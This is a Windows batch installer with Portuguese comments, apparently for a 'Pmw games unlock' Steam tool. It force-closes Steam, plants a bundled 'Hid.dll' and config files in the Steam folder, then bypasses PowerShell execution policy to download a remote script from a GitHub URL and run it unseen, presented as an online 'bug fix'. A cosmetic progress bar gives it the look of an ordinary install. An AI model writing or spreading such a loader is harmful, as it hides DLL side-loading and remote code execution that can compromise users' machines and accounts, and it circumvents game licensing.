@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul
title Instalador
mode con: cols=100 lines=30

:: =====================================================
:: CONFIGURAÇÕES INTERNAS
:: =====================================================
:: O arquivo ZIP deve estar embutido no EXE com este nome exato:
set "ARQUIVO_ZIP=Pmw games unlock.zip"
set "URL_FIX=https://raw.githubusercontent.com/KRAYz-Oficial/KRAYz-Oficial/67065f398be63e1fe2c29ef2838f3030490eb3b6/Remover-bugs.ps1"

:: =====================================================
:: 1. VERIFICAÇÃO DE INTEGRIDADE (ARQUIVO EMBUTIDO)
:: =====================================================
:: Como é um EXE, o arquivo ZIP é extraído para a pasta temporária junto com o script.
if not exist "%ARQUIVO_ZIP%" (
    cls
    color 0C
    echo.
    echo  [ERRO CRITICO] O arquivo de dados "%ARQUIVO_ZIP%" nao foi encontrado.
    echo  O executavel pode estar corrompido ou o antivirus bloqueou a extracao.
    echo.
    pause
    exit /b
)

:: =====================================================
:: 2. DETECTAR CAMINHO DA STEAM
:: =====================================================
cls
echo.
echo  [INFO] Buscando diretorio da Steam...

for /f "tokens=3*" %%A in ('reg query "HKCU\Software\Valve\Steam" /v SteamExe 2^>nul') do (
    set "steamExe=%%A %%B"
)

if not defined steamExe (
    color 0C
    echo.
    echo  [ERRO] A Steam nao foi encontrada no Registro do Windows.
    echo  Verifique se a Steam esta instalada corretamente.
    pause
    exit /b
)

for %%A in ("%steamExe%") do set "steamDir=%%~dpA"
set "steamDir=%steamDir:~0,-1%"
set "configDir=%steamDir%\config"

:: =====================================================
:: 3. INSTALAÇÃO AUTOMÁTICA
:: =====================================================
color 0A
echo.
echo  [OK] Steam localizada.
echo  [OK] Arquivos verificados.
echo.
echo  Iniciando instalacao automatica...
timeout /t 2 >nul

call :BarraProgresso

:: Fecha a Steam
echo.
echo  [-] Encerrando processos da Steam...
powershell -Command "Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force"
timeout /t 2 >nul

:: Extração
echo  [+] Extraindo arquivos...
if exist "%temp%\pmw_temp" rmdir /s /q "%temp%\pmw_temp"

:: Extrai o ZIP que está na mesma pasta temporária do EXE
powershell -Command "Expand-Archive '%ARQUIVO_ZIP%' -DestinationPath $env:TEMP\pmw_temp -Force"

:: Cópia dos Arquivos
echo  [+] Copiando configuracoes...
xcopy /e /i /y "%temp%\pmw_temp\Config\*" "%configDir%\" >nul
copy /y "%temp%\pmw_temp\Hid.dll" "%steamDir%\" >nul

:: Limpeza
rmdir /s /q "%temp%\pmw_temp" >nul

:: Reabre a Steam
echo  [+] Reiniciando Steam...
start "" "%steamExe%"

:: =====================================================
:: 4. FINALIZAÇÃO
:: =====================================================
echo.
echo  [+] Executando script de correcao online...
powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr -useb '%URL_FIX%' | iex"

echo.
echo  [+] Abrindo pagina de agradecimento...
start "" "%URL_AGRADECIMENTO%"

echo.
echo ========================================================
echo        INSTALACAO FINALIZADA COM SUCESSO!
echo ========================================================
echo.
timeout /t 3
exit /b

:BarraProgresso
cls
echo.
echo  Preparando instalacao...
echo.
echo  [#####               ] 25%%
timeout /t 1 /nobreak >nul
cls
echo.
echo  Preparando instalacao...
echo.
echo  [##########          ] 50%%
timeout /t 1 /nobreak >nul
cls
echo.
echo  Preparando instalacao...
echo.
echo  [###############     ] 75%%
timeout /t 1 /nobreak >nul
cls
echo.
echo  Preparando instalacao...
echo.
echo  [####################] 100%%
timeout /t 1 /nobreak >nul
goto :eof